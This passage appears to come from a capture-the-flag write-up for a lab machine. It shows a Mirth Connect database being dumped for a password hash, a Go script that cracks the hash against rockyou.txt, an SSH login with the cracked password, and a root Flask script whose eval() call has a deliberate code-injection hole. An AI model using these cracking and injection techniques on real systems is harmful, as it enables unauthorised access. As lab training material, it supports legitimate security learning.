+database.enable-read-write-split = true
+</pre></code></div><p>With this, we can connect to the database:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+mirth@interpreter:/usr/local/mirthconnect$ mariadb --user=mirthdb --password=MirthPass123! --database=mc_bdd_prod
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+<span class="code-white">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
+<span class="code-white">Your MariaDB connection id is 35</span>
+<span class="code-white">Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12</span>
+
+<span class="code-white">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>
+
+<span class="code-white">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>
+
+MariaDB [mc_bdd_prod]&gt; show tables;
++-----------------------+
+| Tables_in_mc_bdd_prod |
++-----------------------+
+| ALERT                 |
+| CHANNEL               |
+| CHANNEL_GROUP         |
+| CODE_TEMPLATE         |
+| CODE_TEMPLATE_LIBRARY |
+| CONFIGURATION         |
+| DEBUGGER_USAGE        |
+| D_CHANNELS            |
+| D_M1                  |
+| D_MA1                 |
+| D_MC1                 |
+| D_MCM1                |
+| D_MM1                 |
+| D_MS1                 |
+| D_MSQ1                |
+| EVENT                 |
+| PERSON                |
+| PERSON_PASSWORD       |
+| PERSON_PREFERENCE     |
+| SCHEMA_INFO           |
+| SCRIPT                |
++-----------------------+
+<span class="code-white">21 rows in set (0.001 sec)</span>
+</pre></code></div><p>There are two relevant tables: <code>PERSON</code> and <code>PERSON_PASSWORD</code>.</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+MariaDB [mc_bdd_prod]&gt; describe PERSON;
++--------------------+--------------+------+-----+---------+----------------+
+| Field              | Type         | Null | Key | Default | Extra          |
++--------------------+--------------+------+-----+---------+----------------+
+| ID                 | int(11)      | NO   | PRI | NULL    | auto_increment |
+| USERNAME           | varchar(40)  | NO   |     | NULL    |                |
+| FIRSTNAME          | varchar(40)  | YES  |     | NULL    |                |
+| LASTNAME           | varchar(40)  | YES  |     | NULL    |                |
+| ORGANIZATION       | varchar(255) | YES  |     | NULL    |                |
+| INDUSTRY           | varchar(255) | YES  |     | NULL    |                |
+| EMAIL              | varchar(255) | YES  |     | NULL    |                |
+| PHONENUMBER        | varchar(40)  | YES  |     | NULL    |                |
+| DESCRIPTION        | varchar(255) | YES  |     | NULL    |                |
+| LAST_LOGIN         | timestamp    | YES  |     | NULL    |                |
+| GRACE_PERIOD_START | timestamp    | YES  |     | NULL    |                |
+| STRIKE_COUNT       | int(11)      | YES  |     | NULL    |                |
+| LAST_STRIKE_TIME   | timestamp    | YES  |     | NULL    |                |
+| LOGGED_IN          | bit(1)       | NO   |     | NULL    |                |
+| ROLE               | varchar(40)  | YES  |     | NULL    |                |
+| COUNTRY            | varchar(40)  | YES  |     | NULL    |                |
+| STATETERRITORY     | varchar(40)  | YES  |     | NULL    |                |
+| USERCONSENT        | tinyint(1)   | NO   |     | 0       |                |
++--------------------+--------------+------+-----+---------+----------------+
+<span class="code-white">18 rows in set (0.001 sec)</span>
+
+MariaDB [mc_bdd_prod]&gt; describe PERSON_PASSWORD;
++---------------+--------------+------+-----+---------+-------+
+| Field         | Type         | Null | Key | Default | Extra |
++---------------+--------------+------+-----+---------+-------+
+| PERSON_ID     | int(11)      | NO   | MUL | NULL    |       |
+| PASSWORD      | varchar(255) | NO   |     | NULL    |       |
+| PASSWORD_DATE | timestamp    | YES  |     | NULL    |       |
++---------------+--------------+------+-----+---------+-------+
+<span class="code-white">3 rows in set (0.001 sec)</span>
+
+MariaDB [mc_bdd_prod]&gt; SELECT ID, USERNAME from PERSON;
++----+----------+
+| ID | USERNAME |
++----+----------+
+|  2 | sedric   |
++----+----------+
+<span class="code-white">1 row in set (0.000 sec)</span>
+
+MariaDB [mc_bdd_prod]&gt; SELECT PERSON_ID, PASSWORD from PERSON_PASSWORD;
++-----------+----------------------------------------------------------+
+| PERSON_ID | PASSWORD                                                 |
++-----------+----------------------------------------------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
++-----------+----------------------------------------------------------+
+<span class="code-white">1 row in set (0.000 sec)</span>
+</pre></code></div><p>Alright, so we get a username <code>sedric</code> and a password hash. Now we need to determine which type of hash it is.</p><h2 id="lateral-movement-to-sedric">Lateral movement to <code>sedric</code></h2><p>For this purpose, we can take a look at the codebase of Mirth Connect in <a target="_blank" href="https://github.com/nextgenhealthcare/connect">GitHub</a>. The relevant Java files are:</p><ul><li><a target="_blank" href="https://github.com/nextgenhealthcare/connect/blob/development/core-util/src/com/mirth/commons/encryption/Digester.java">Digester.java</a></li><li><a target="_blank" href="https://github.com/nextgenhealthcare/connect/blob/development/core-util/test/com/mirth/commons/encryption/test/DigesterTest.java">DigesterTest.java</a></li></ul><p>There are several hashing algorithms supported, but we must focus on the default one, which is PBKDF2 with HMAC-SHA256 and 600000 iterations:</p><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
+<span class="mtk5">public</span> <span class="mtk5">class</span> <span class="mtk8 mtku">Digester</span><span class="mtk1"> {</span>
+    <span class="mtk5">public</span> <span class="mtk5">static</span> <span class="mtk5">final</span> <span class="mtk7 mtki">int</span><span class="mtk1"> DEFAULT_SALT_SIZE </span><span class="mtk5">=</span> <span class="mtk6">8</span><span class="mtk1">;</span>
+    <span class="mtk5">public</span> <span class="mtk5">static</span> <span class="mtk5">final</span> <span class="mtk7 mtki">int</span><span class="mtk1"> DEFAULT_ITERATIONS </span><span class="mtk5">=</span> <span class="mtk6">600000</span><span class="mtk1">;</span>
+    <span class="mtk5">public</span> <span class="mtk5">static</span> <span class="mtk5">final</span> <span class="mtk7 mtki">int</span><span class="mtk1"> DEFAULT_KEY_SIZE_BITS </span><span class="mtk5">=</span> <span class="mtk6">256</span><span class="mtk1">;</span>
+
+    <span class="mtk5">private</span> <span class="mtk7 mtki">String</span><span class="mtk1"> algorithm </span><span class="mtk5">=</span> <span class="mtk4">"PBKDF2WithHmacSHA256"</span><span class="mtk1">;</span>
+    <span class="mtk5">private</span> <span class="mtk7 mtki">Provider</span><span class="mtk1"> provider;</span>
+    <span class="mtk5">private</span> <span class="mtk7 mtki">Output</span><span class="mtk1"> format </span><span class="mtk5">=</span><span class="mtk1"> Output.BASE64;</span>
+    <span class="mtk5">private</span> <span class="mtk7 mtki">boolean</span><span class="mtk1"> initialized </span><span class="mtk5">=</span> <span class="mtk6">false</span><span class="mtk1">;</span>
+
+    <span class="mtk3">// ...</span>
+}
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>Fortunately, <code>DigesterTest.java</code> shows an example that should work:</p><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
+<span class="mtk5">public</span> <span class="mtk5">class</span> <span class="mtk8 mtku">DigesterTest</span><span class="mtk1"> {</span>
+
+    <span class="mtk3">// ...</span>
+
+    <span class="mtk5">private</span> <span class="mtk5">static</span> <span class="mtk5">final</span> <span class="mtk7 mtki">String</span><span class="mtk1"> HASH_PBKDF2_ADMIN </span><span class="mtk5">=</span> <span class="mtk4">"b8cA3mDkavInMc2JBYa6/C3EGxDp7ppqh7FsoXx0x8+3LWK3Ed3ELg=="</span><span class="mtk1">;</span>
+
+    <span class="mtk3">// ...</span>
+
+<span class="mtk1">    @</span><span class="mtk7 mtki">Test</span>
+    <span class="mtk5">public</span> <span class="mtk7 mtki">void</span> <span class="mtk8">testPBKDF2</span><span class="mtk1">() </span><span class="mtk5">throws</span> <span class="mtk7 mtki">Exception</span><span class="mtk1"> {</span>
+        <span class="mtk7 mtki">Digester</span><span class="mtk1"> digester </span><span class="mtk5">=</span> <span class="mtk8">createDigester</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> org.bouncycastle.jce.provider.</span><span class="mtk8">BouncyCastleProvider</span><span class="mtk1">(), </span><span class="mtk4">"PBKDF2WithHmacSHA256"</span><span class="mtk1">, </span><span class="mtk6">600000</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">, </span><span class="mtk6">256</span><span class="mtk1">);</span>
+
+        <span class="mtk7 mtki">String</span><span class="mtk1"> input1 </span><span class="mtk5">=</span> <span class="mtk4">"admin"</span><span class="mtk1">;</span>
+        <span class="mtk7 mtki">String</span><span class="mtk1"> digest1 </span><span class="mtk5">=</span><span class="mtk1"> digester.</span><span class="mtk8">digest</span><span class="mtk1">(input1);</span>
+        <span class="mtk8">assertFalse</span><span class="mtk1">(StringUtils.</span><span class="mtk8">isBlank</span><span class="mtk1">(digest1));</span>
+        <span class="mtk8">assertFalse</span><span class="mtk1">(input1.</span><span class="mtk8">equals</span><span class="mtk1">(digest1));</span>
+        <span class="mtk8">assertTrue</span><span class="mtk1">(digester.</span><span class="mtk8">matches</span><span class="mtk1">(input1, digest1));</span>
+
+        <span class="mtk8">assertTrue</span><span class="mtk1">(digester.</span><span class="mtk8">matches</span><span class="mtk1">(</span><span class="mtk4">"admin"</span><span class="mtk1">, HASH_PBKDF2_ADMIN));</span>
+
+        <span class="mtk3">// ...</span>
+    }
+
+    <span class="mtk3">// ...</span>
+}
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>Having this, we can write a custom script to crack <code>sedric</code>&rsquo;s hash. I used Go for this purpose because I have a similar script for <a target="_blank" href="../titanic#finding-passwords">Titanic</a>:</p><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
+<span class="mtk5">package</span> <span class="mtk8 mtku">main</span>
+
+<span class="mtk5">import</span><span class="mtk1"> (</span>
+        <span class="mtk4">"bufio"</span>
+        <span class="mtk4">"bytes"</span>
+        <span class="mtk4">"fmt"</span>
+        <span class="mtk4">"os"</span>
+
+        <span class="mtk4">"crypto/sha256"</span>
+
+        <span class="mtk4">"encoding/base64"</span>
+
+        <span class="mtk4">"golang.org/x/crypto/pbkdf2"</span>
+<span class="mtk1">)</span>
+
+<span class="mtk5">var</span><span class="mtk1"> (</span>
+<span class="mtk1">        adminHash      </span><span class="mtk5">=</span> <span class="mtk4">"b8cA3mDkavInMc2JBYa6/C3EGxDp7ppqh7FsoXx0x8+3LWK3Ed3ELg=="</span>
+<span class="mtk1">        hashedPassword </span><span class="mtk5">=</span> <span class="mtk4">"u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="</span>
+<span class="mtk1">)</span>
+
+<span class="mtk5">func</span> <span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk9 mtki">hash</span><span class="mtk1">, </span><span class="mtk9 mtki">password</span> <span class="mtk7 mtki">string</span><span class="mtk1">) </span><span class="mtk7 mtki">bool</span><span class="mtk1"> {</span>
+<span class="mtk1">        decoded, _ </span><span class="mtk5">:=</span><span class="mtk1"> base64.StdEncoding.</span><span class="mtk8">DecodeString</span><span class="mtk1">(hash)</span>
+<span class="mtk1">        salt, h </span><span class="mtk5">:=</span><span class="mtk1"> decoded[:</span><span class="mtk6">8</span><span class="mtk1">], decoded[</span><span class="mtk6">8</span><span class="mtk1">:]</span>
+        <span class="mtk5">return</span><span class="mtk1"> bytes.</span><span class="mtk8">Equal</span><span class="mtk1">(h, pbkdf2.</span><span class="mtk8">Key</span><span class="mtk1">([]</span><span class="mtk7 mtki">byte</span><span class="mtk1">(password), salt, </span><span class="mtk6">600000</span><span class="mtk1">, </span><span class="mtk6">32</span><span class="mtk1">, sha256.New))</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">func</span> <span class="mtk8">main</span><span class="mtk1">() {</span>
+        <span class="mtk5">if</span> <span class="mtk5">!</span><span class="mtk8">crack</span><span class="mtk1">(adminHash, </span><span class="mtk4">"admin"</span><span class="mtk1">) {</span>
+<span class="mtk1">                os.</span><span class="mtk8">Exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        rockyou, _ </span><span class="mtk5">:=</span><span class="mtk1"> os.</span><span class="mtk8">Open</span><span class="mtk1">(</span><span class="mtk4">"rockyou.txt"</span><span class="mtk1">)</span>
+        <span class="mtk5">defer</span><span class="mtk1"> rockyou.</span><span class="mtk8">Close</span><span class="mtk1">()</span>
+
+<span class="mtk1">        scanner </span><span class="mtk5">:=</span><span class="mtk1"> bufio.</span><span class="mtk8">NewScanner</span><span class="mtk1">(rockyou)</span>
+
+        <span class="mtk5">for</span><span class="mtk1"> scanner.</span><span class="mtk8">Scan</span><span class="mtk1">() {</span>
+<span class="mtk1">                password </span><span class="mtk5">:=</span><span class="mtk1"> scanner.</span><span class="mtk8">Text</span><span class="mtk1">()</span>
+
+                <span class="mtk5">if</span> <span class="mtk8">crack</span><span class="mtk1">(hashedPassword, password) {</span>
+<span class="mtk1">                        fmt.</span><span class="mtk8">Println</span><span class="mtk1">(password)</span>
+                        <span class="mtk5">break</span>
+<span class="mtk1">                }</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">}</span>
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>The script is easy to understand. The only difference is that Java uses 256 as key size (in bits), so we must use 32 as key size in Go (in bytes). If we run the script, we will find <code>sedric</code>&rsquo;s password after a long time (around 10 minutes):</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">crack.go</span>
+snowflake1
+</pre></code></div><p>With this, we can access via SSH:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> sedric@10.129.6.63
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ cat user.txt
+3cae88bdd2295eb3a5248ceb5eb0e752
+</pre></code></div><h2 id="privilege-escalation">Privilege escalation</h2><p>If we enumerate running processes as <code>root</code>, we will see that there is a process running a Python script:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ ps -faux | grep root | tail
+root        2890  0.0  0.1  16552  5936 ?        Ss   10:16   0:00 /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+root        3251  0.0  0.0   5876  3584 ?        Ss   10:16   0:00 dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+root        3381  0.1  0.2 144712 11300 ?        Sl   10:16   0:06 /usr/sbin/vmtoolsd
+root        3436  0.0  0.2  40776 11364 ?        S    10:16   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root        3549  0.0  0.6 400212 25500 ?        Ssl  10:16   0:02 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+root        3552  0.0  0.7  39872 31068 ?        Ss   10:16   0:01 /usr/bin/python3 /usr/local/bin/notif.py
+root        3560  0.0  0.0   5880  1020 tty1     Ss+  10:16   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+root        3587  0.0  0.2  15452  8864 ?        Ss   10:16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root        4044  0.1  0.2  17840 11220 ?        Ss   11:38   0:00  \_ sshd: sedric [priv]
+sedric      4074  0.0  0.0   6340  2124 pts/1    S+   11:39   0:00              \_ grep root
+<span class="code-green">sedric@interpreter</span>:<span class="code-blue">~</span>$ cat /usr/local/bin/notif.py
+</pre></code></div><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
+<span class="mtk3">#!/usr/bin/env python3</span>
+<span class="mtk4">"""</span>
+<span class="mtk4">Notification server for added patients.</span>
+<span class="mtk4">This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.</span>
+<span class="mtk4">It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.</span>
+<span class="mtk4">It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.</span>
+<span class="mtk4">"""</span>
+<span class="mtk5">from</span> <span class="mtk8 mtku">flask</span> <span class="mtk5">import</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">, </span><span class="mtk1">request</span><span class="mtk1">, </span><span class="mtk8">abort</span>
+<span class="mtk5">import</span> <span class="mtk8 mtku">re</span>
+<span class="mtk5">import</span> <span class="mtk8 mtku">uuid</span>
+<span class="mtk5">from</span> <span class="mtk8 mtku">datetime</span> <span class="mtk5">import</span> <span class="mtk8 mtku">datetime</span>
+<span class="mtk5">import</span> <span class="mtk8 mtku">xml.etree.ElementTree</span> <span class="mtk5">as</span> <span class="mtk8 mtku">ET</span><span class="mtk1">, </span><span class="mtk8 mtku">os</span>
+
+<span class="mtk1">app</span> <span class="mtk5">=</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">(__name__)</span>
+<span style="color:#4ec9b0">USER_DIR</span> <span class="mtk5">=</span> <span class="mtk4">"/var/secure-health/patients/"</span><span class="mtk1">; </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">makedirs</span><span class="mtk1">(</span><span style="color:#4ec9b0">USER_DIR</span><span class="mtk1">, </span><span class="mtk9 mtki">exist_ok</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+
+<span class="mtk7 mtki">def</span> <span class="mtk8">template</span><span class="mtk1">(</span><span class="mtk9 mtki">first</span><span class="mtk1">, </span><span class="mtk9 mtki">last</span><span class="mtk1">, </span><span class="mtk9 mtki">sender</span><span class="mtk1">, </span><span class="mtk9 mtki">ts</span><span class="mtk1">, </span><span class="mtk9 mtki">dob</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">):</span>
+    <span class="mtk1">pattern</span> <span class="mtk5">=</span> <span class="mtk8 mtku">re</span><span class="mtk1">.</span><span class="mtk8">compile</span><span class="mtk1">(</span><span class="mtk7 mtki">r</span><span class="mtk4">"^</span><span class="mtk6">[a-zA-Z0-9._'\"(){}=+/]</span><span class="mtk5">+</span><span class="mtk4">$"</span><span class="mtk1">)</span>
+    <span class="mtk5">for</span> <span class="mtk1">s</span> <span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk9 mtki">first</span><span class="mtk1">, </span><span class="mtk9 mtki">last</span><span class="mtk1">, </span><span class="mtk9 mtki">sender</span><span class="mtk1">, </span><span class="mtk9 mtki">ts</span><span class="mtk1">, </span><span class="mtk9 mtki">dob</span><span class="mtk1">, </span><span class="mtk9 mtki">gender</span><span class="mtk1">]:</span>
+        <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk1">pattern</span><span class="mtk1">.</span><span class="mtk8">fullmatch</span><span class="mtk1">(</span><span class="mtk1">s</span><span class="mtk1">):</span>
+            <span class="mtk5">return</span> <span class="mtk4">"[INVALID_INPUT]"</span>
+    <span class="mtk3"># DOB format is DD/MM/YYYY</span>
+    <span class="mtk5">try</span><span class="mtk1">:</span>
+        <span class="mtk1">year_of_birth</span> <span class="mtk5">=</span> <span class="mtk7 mtki">int</span><span class="mtk1">(</span><span class="mtk9 mtki">dob</span><span class="mtk1">.</span><span class="mtk1">split</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">])</span>
+        <span class="mtk5">if</span> <span class="mtk1">year_of_birth</span> <span class="mtk5">&lt;</span> <span class="mtk6">1900</span> <span class="mtk5">or</span> <span class="mtk1">year_of_birth</span> <span class="mtk5">&gt;</span> <span class="mtk8 mtku">datetime</span><span class="mtk1">.</span><span class="mtk8">now</span><span class="mtk1">().</span><span class="mtk1">year</span><span class="mtk1">:</span>
+            <span class="mtk5">return</span> <span class="mtk4">"[INVALID_DOB]"</span>
+    <span class="mtk5">except</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk4">"[INVALID_DOB]"</span>
+    <span class="mtk1">template</span> <span class="mtk5">=</span> <span class="mtk7 mtki">f</span><span class="mtk4">"Patient </span><span class="mtk6">{</span><span class="mtk9 mtki">first</span><span class="mtk6">}</span><span class="mtk4"> </span><span class="mtk6">{</span><span class="mtk9 mtki">last</span><span class="mtk6">}</span><span class="mtk4"> (</span><span class="mtk6">{</span><span class="mtk9 mtki">gender</span><span class="mtk6">}</span><span class="mtk4">), </span><span class="mtk6">{</span><span class="mtk6">{</span><span class="mtk4">datetime.now().year - year_of_birth</span><span class="mtk6">}}</span><span class="mtk4"> years old, received from </span><span class="mtk6">{</span><span class="mtk9 mtki">sender</span><span class="mtk6">}</span><span class="mtk4"> at </span><span class="mtk6">{</span><span class="mtk9 mtki">ts</span><span class="mtk6">}</span><span class="mtk4">"</span>
+    <span class="mtk5">try</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk7">eval</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"f'''</span><span class="mtk6">{</span><span class="mtk1">template</span><span class="mtk6">}</span><span class="mtk4">'''"</span><span class="mtk1">)</span>
+    <span class="mtk5">except</span> <span class="mtk7 mtki">Exception</span> <span class="mtk5">as</span> <span class="mtk1">e</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk7 mtki">f</span><span class="mtk4">"[EVAL_ERROR] </span><span class="mtk6">{</span><span class="mtk1">e</span><span class="mtk6">}</span><span class="mtk4">"</span>
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/addPatient"</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">"POST"</span><span class="mtk1">])</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">receive</span><span class="mtk1">():</span>
+    <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">remote_addr</span> <span class="mtk5">!=</span> <span class="mtk4">"127.0.0.1"</span><span class="mtk1">:</span>
+        <span class="mtk8">abort</span><span class="mtk1">(</span><span class="mtk6">403</span><span class="mtk1">)</span>
+    <span class="mtk5">try</span><span class="mtk1">:</span>
+        <span class="mtk1">xml_text</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">decode</span><span class="mtk1">()</span>
+        <span class="mtk1">xml_root</span> <span class="mtk5">=</span> <span class="mtk8 mtku">ET</span><span class="mtk1">.</span><span class="mtk8">fromstring</span><span class="mtk1">(</span><span class="mtk1">xml_text</span><span class="mtk1">)</span>
+    <span class="mtk5">except</span> <span class="mtk8 mtku">ET</span><span class="mtk1">.</span><span class="mtk8 mtku">ParseError</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk4">"XML ERROR</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">400</span>
+    <span class="mtk1">patient</span> <span class="mtk5">=</span> <span class="mtk1">xml_root</span> <span class="mtk5">if</span> <span class="mtk1">xml_root</span><span class="mtk1">.</span><span class="mtk1">tag</span><span class="mtk5">==</span><span class="mtk4">"patient"</span> <span class="mtk5">else</span> <span class="mtk1">xml_root</span><span class="mtk1">.</span><span class="mtk8">find</span><span class="mtk1">(</span><span class="mtk4">"patient"</span><span class="mtk1">)</span>
+    <span class="mtk5">if</span> <span class="mtk1">patient</span> <span class="mtk5">is</span> <span class="mtk6">None</span><span class="mtk1">:</span>
+        <span class="mtk5">return</span> <span class="mtk4">"No &lt;patient&gt; tag found</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">400</span>
+    <span class="mtk1">id</span> <span class="mtk5">=</span> <span class="mtk8 mtku">uuid</span><span class="mtk1">.</span><span class="mtk8">uuid4</span><span class="mtk1">().</span><span class="mtk1">hex</span>
+    <span class="mtk1">data</span> <span class="mtk5">=</span><span class="mtk1"> {tag: (</span><span class="mtk1">patient</span><span class="mtk1">.</span><span class="mtk8">findtext</span><span class="mtk1">(tag) </span><span class="mtk5">or</span> <span class="mtk4">""</span><span class="mtk1">) </span><span class="mtk5">for</span> <span class="mtk1">tag</span> <span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk4">"firstname"</span><span class="mtk1">,</span><span class="mtk4">"lastname"</span><span class="mtk1">,</span><span class="mtk4">"sender_app"</span><span class="mtk1">,</span><span class="mtk4">"timestamp"</span><span class="mtk1">,</span><span class="mtk4">"birth_date"</span><span class="mtk1">,</span><span class="mtk4">"gender"</span><span class="mtk1">]}</span>
+    <span class="mtk1">notification</span> <span class="mtk5">=</span> <span class="mtk8">template</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"firstname"</span><span class="mtk1">],</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"lastname"</span><span class="mtk1">],</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"sender_app"</span><span class="mtk1">],</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"timestamp"</span><span class="mtk1">],</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"birth_date"</span><span class="mtk1">],</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk4">"gender"</span><span class="mtk1">])</span>
+    <span class="mtk1">path</span> <span class="mtk5">=</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span style="color:#4ec9b0">USER_DIR</span><span class="mtk1">,</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">id</span><span class="mtk6">}</span><span class="mtk4">.txt"</span><span class="mtk1">)</span>
+    <span class="mtk5">with</span> <span class="mtk7">open</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">,</span><span class="mtk4">"w"</span><span class="mtk1">) </span><span class="mtk5">as</span> <span class="mtk1">f</span><span class="mtk1">:</span>
+<span class="mtk1">        f.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">notification</span><span class="mtk5">+</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">)</span>
+    <span class="mtk5">return</span> <span class="mtk1">notification</span>
+
+<span class="mtk5">if</span><span class="mtk1"> __name__</span><span class="mtk5">==</span><span class="mtk4">"__main__"</span><span class="mtk1">:</span>
+    <span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk4">"127.0.0.1"</span><span class="mtk1">,</span><span class="mtk6">54321</span><span class="mtk1">, </span><span class="mtk9 mtki">threaded</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+</pre></code></div><button class="copy-code-btn" aria-label="Copy code">
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div><p>It is an internal Flask server running on port 54321, we could access it via port forwarding with SSH, although it is not necessary:</p><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="cconsole" tabindex="0">
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -fNL 54321:127.0.0.1:54321 sedric@10.129.6.63
+sedric@10.129.6.63's password:
+</pre></code></div><h3 id="python-code-injection">Python code injection</h3><p>If we analyze the Flask script, we can see that it allows to send an XML document to <code>/addPatient</code> endpoint. Some fields will be extracted from the XML document and used to generate a notification with function <code>template</code>.</p><p>For instance, we must use an XML document with <code>&lt;patient></code> tag, and inner tags <code>&lt;firstname></code>, <code>&lt;lastname></code>, <code>&lt;sender_app></code>, <code>&lt;timestamp></code>, <code>&lt;birth_date></code> and <code>&lt;gender></code>; as shown in the endpoint handler.</p><p>Then, these values are passed to <code>template</code>:</p><div class="code-container" style="position:relative"><div class="highlight" data-pagefind-ignore="all"><code class="ma0 pa0 white"><pre class="ccode" tabindex="0">
